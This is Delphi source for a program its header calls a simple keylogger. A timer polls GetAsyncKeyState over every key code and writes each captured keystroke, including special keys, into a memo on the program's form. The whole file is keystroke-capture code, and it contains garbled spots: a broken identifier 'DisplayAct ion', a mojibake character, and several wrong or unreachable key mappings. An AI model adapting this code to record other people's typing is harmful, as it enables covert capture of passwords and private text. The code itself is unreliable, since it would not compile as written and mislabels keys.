unit Unit1;
(******************************************************)
(*                                                    *)
(*    Simple Keylogger without hook (Single values)   *)
(*        Timothy Schiess                             *)
(*       19.02.2015                                   *)
(*                                                    *)
(******************************************************)
interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Memo1: TMemo;
    Timer1: TTimer;
    Memo2: TMemo;
    procedure Button1Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private-Deklarationen }
  public
    { Public-Deklarationen }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function DisplayAction(txt: String): String; // Adds text to Memo if exception is detected
begin
form1.Memo1.Lines.add(txt);
end;

procedure TForm1.Button1Click(Sender: TObject); // Clears all memos
begin
Memo1.text := '';
Memo2.Text := '';
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
InputKey, KeyResult : Integer;
begin
InputKey := 0;
repeat
  keyresult := GetAsyncKeyState(InputKey); // Reads when key is pressed
  if KeyResult = -32767 then // -32767: Key is pressed at the moment
  begin
  case InputKey of  // Defines key values for exceptions (special keys where there is no ASCII value)
    8: DisplayAction(' [BACKSPACE] ');
    9: DisplayAction(' [TAB] ');
    12: DisplayAction(' [ALT] ');
    13: DisplayAction(' [ENTER] ');
    16: DisplayAction(' [SHIFT] ');
    17: DisplayAction(' [CONTROL] ');
    18: DisplayAction(' [ALT] ');
    20: DisplayAction(' [CAPS LOCK] ');
    96: DisplayAction(' 0 ');
    97: DisplayAction(' 1 ');
    98: DisplayAction(' 2 ');
    99: DisplayAction(' 3 ');
    100: DisplayAction(' 4 ');
    101: DisplayAction(' 5 ');
    102: DisplayAction(' 6 ');
    103: DisplayAction(' 7  ');
    104: DisplayAction(' 8 ');
    105: DisplayAction(' 9 ');
    106: DisplayAction(' * ');
    107: DisplayAction(' + ');
    109: DisplayAction(' - ');
    111: DisplayAction(' / ');
    112: DisplayAction(' [F1] ');
    113: DisplayAction(' [F2] ');
    114: DisplayAction(' [F3] ');
    115: DisplayAction(' [F4] ');
    116: DisplayAction(' [F5] ');
    117: DisplayAction(' [F6] ');
    118: DisplayAction(' [F7] ');
    119: DisplayAction(' [F8] ');
    120: DisplayAction(' [F9] ');
    121: DisplayAction(' [F10] ');
    122: DisplayAction(' [F11] ');
    123: DisplayAction(' [F12] ');
    187: DisplayAct ion(' = ');
    188: DisplayAction(' , ');
    189: DisplayAction(' - ');
    190: DisplayAction(' . ');
    191: DisplayAction(' ; ');
    192: DisplayAction(' " ');
    193: DisplayAction(' / ');
    219: DisplayAction(' � ');
    220: DisplayAction(' ] ');
    221: DisplayAction(' [ ');
    222: DisplayAction(' ~ ');
    226: DisplayAction(' \ ');
    else

    // Normal letters (excluding 64:@)
    if (InputKey >=32) and (InputKey <=110) then
    begin
      if (InputKey >= 65) and (InputKey <= 90) then
        Memo1.Text := Memo1.Text + Chr(InputKey);
      if (InputKey >= 32) and (InputKey <= 63) then
        Memo1.Text := Memo1.Text + Chr(InputKey);

      // Numpad Keys
      if (InputKey >= 96) and (InputKey <= 110) then
        Memo1.Text := Memo1.Text + Chr(InputKey);
      end
      else // Exception for all undefined keys
        memo1.Lines.add(IntToStr(InputKey));
      end;
  end; //case;
  inc(InputKey); // End repeat
until InputKey = 255;

end;

end.
